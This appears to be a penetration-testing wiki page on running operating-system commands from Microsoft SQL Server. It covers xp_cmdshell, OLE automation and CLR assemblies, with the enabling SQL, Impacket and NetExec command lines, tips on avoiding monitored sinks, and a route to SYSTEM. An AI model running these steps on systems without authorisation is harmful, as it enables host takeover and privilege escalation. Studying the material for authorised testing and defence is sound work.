---
title: "MSSQL command execution: xp_cmdshell and other sinks"
description: "Running operating-system commands from SQL Server as the service account through xp_cmdshell, OLE automation procedures, and CLR assemblies, the main sinks that turn a sysadmin session into code execution on the host."
keywords:
  - xp_cmdshell
  - OLE automation
  - sp_OACreate
  - CLR assembly
  - MSSQL RCE
---

# MSSQL command execution

With sysadmin (or a path to it through [impersonation](impersonation.md) or [linked servers](linked-servers.md)), SQL Server will run **operating-system commands as its service account**. There are three main sinks; `xp_cmdshell` is the direct one, OLE automation and CLR are the fallbacks when it is locked down or watched.

## xp_cmdshell

Disabled by default, but a sysadmin re-enables it in two statements:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```bash
# Impacket and NetExec wrap the enable-and-run
mssqlclient.py ...   # then:  enable_xp_cmdshell   /   xp_cmdshell whoami
nxc mssql <target> -u sa -p pass --local-auth -x "whoami"   # -X for a PowerShell payload
```

## OLE automation

When `xp_cmdshell` is unavailable, the OLE automation procedures instantiate a WScript shell to run commands:

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @o INT;
EXEC sp_OACreate 'WScript.Shell', @o OUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\out.txt';
```

## CLR assemblies

A sysadmin can load a .NET assembly that exposes a procedure running code in-process, which avoids spawning `cmd.exe` and is quieter:

```sql
-- load a CLR assembly from a hex blob or a reachable path, then call its procedure
-- tools: Invoke-SqlServer / PowerUpSQL Invoke-SQLOSCmd handle the assembly plumbing
```

## Exploitation notes

- Commands run as the **SQL Server service account**, so the payoff depends on that account: often a low service account (pivot via [token impersonation](../../directory/active-directory/authentication/credentials/token-impersonation.md), since it usually holds `SeImpersonate`) or sometimes `LocalSystem` or a domain account.
- Prefer **CLR or OLE** where `xp_cmdshell` is monitored or policy-blocked; all three need sysadmin, so reach sysadmin first via impersonation or linked servers.
- `PowerUpSQL` `Invoke-SQLOSCmd` picks an available sink automatically, which is convenient across hardened instances.
- Command execution plus the service account's `SeImpersonate` is the standard **MSSQL-to-SYSTEM** chain on the host.

## Tools

- **PowerUpSQL** (`Invoke-SQLOSCmd`): sink-agnostic OS command execution.
- **Impacket `mssqlclient.py`** (`enable_xp_cmdshell`): interactive enable-and-run.
- **NetExec `mssql`** (`-x`/`-X`): command and PowerShell execution from the network.

## References

- [NetExec: MSSQL command execution](https://www.hackingarticles.in/mssql-for-pentester-netexec/)
- [PowerUpSQL (NetSPI)](https://github.com/NetSPI/PowerUpSQL)
- [Microsoft: xp_cmdshell server configuration](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
